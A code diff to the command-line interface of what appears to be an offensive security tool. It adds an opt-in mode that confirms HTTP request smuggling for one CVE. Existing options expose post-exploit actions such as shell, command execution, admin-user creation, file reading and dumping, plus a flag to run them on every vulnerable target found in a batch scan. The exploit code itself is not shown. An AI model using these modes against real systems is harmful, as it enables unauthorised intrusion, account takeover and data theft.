@@ -170,6 +170,10 @@ Exemplos:
     sg.add_argument("--smuggle-check",      dest="smuggle_check", action="store_true",
                     help="Detectar HTTP request smuggling CL.TE/TE.CL "
                          "(CVE-2026-58047) — requer alvo único (-u)")
+    sg.add_argument("--smuggle-confirm",    dest="smuggle_confirm", action="store_true",
+                    help="Confirmar o smuggling observando resposta enfileirada. "
+                         "ATENÇÃO: reusa a conexão do back-end e pode afetar "
+                         "outros usuários. Opt-in, alvo único")
     sg.add_argument("--cve",                default=None,
                     help="CVE a explorar (padrão: CVE-2026-41940). Ver --list-cves")
     sg.add_argument("--list-cves",          dest="list_cves", action="store_true",
@@ -179,7 +183,7 @@ Exemplos:
     ag.add_argument("--action",
                     choices=["list", "passwd", "cmd", "exec", "info",
                              "version", "shell", "adduser", "addadmin",
-                             "readfile", "dump"],
+                             "readfile", "dump", "cves"],
                     help="Ação post-exploit a executar após um bypass exitoso")
     ag.add_argument("--post-all",        action="store_true",
                     help="Executar --action em TODOS os alvos vulneráveis após o scan batch")
@@ -350,10 +354,10 @@ Exemplos:
         sys.exit(0)
 
     # ── Modo smuggling (CVE-2026-58047, alvo único) ─────────────
-    if getattr(args, "smuggle_check", False):
+    if getattr(args, "smuggle_check", False) or getattr(args, "smuggle_confirm", False):
         if len(targets) != 1:
-            p.error("--smuggle-check requer um alvo único (-u)")
-        from .smuggling import detect as smuggle_detect
+            p.error("--smuggle-check/--smuggle-confirm requerem um alvo único (-u)")
+        from .smuggling import detect as smuggle_detect, confirm as smuggle_confirm
         tg = targets[0]
         if "://" not in tg:
             tg = "https://" + tg
@@ -363,8 +367,18 @@ Exemplos:
             if found:
                 tg = found
         scheme, host, port = parse_target(tg)
+
         res = smuggle_detect(scheme, host, port, timeout=args.timeout)
+        if getattr(args, "smuggle_confirm", False):
+            log("WARN", "Confirmando desincronização — reusa a conexão do "
+                        "back-end; execute só contra alvo autorizado")
+            conf = smuggle_confirm(scheme, host, port, timeout=args.timeout)
+            res["confirmation"] = conf
+            if conf.get("confirmed"):
+                res["vulnerable"] = True
+                res["technique"] = conf.get("technique", res.get("technique", ""))
         print(json.dumps(res, indent=2, ensure_ascii=False))
+
         if args.output:
             save_output([{
                 "severity":  "HIGH" if res["vulnerable"] else "INFO",
@@ -373,7 +387,9 @@ Exemplos:
                 "cve":       "CVE-2026-58047",
                 "cvss":      f"{cves.cvss_of('CVE-2026-58047', 5.6):.1f}",
                 "technique": res.get("technique", ""),
-                "evidence":  json.dumps(res.get("findings", []), ensure_ascii=False)[:400],
+                "evidence":  json.dumps(
+                    res.get("confirmation", res.get("findings", [])),
+                    ensure_ascii=False)[:400],
                 "timestamp": datetime.now().isoformat(),
             }], args.output)
         sys.exit(0)
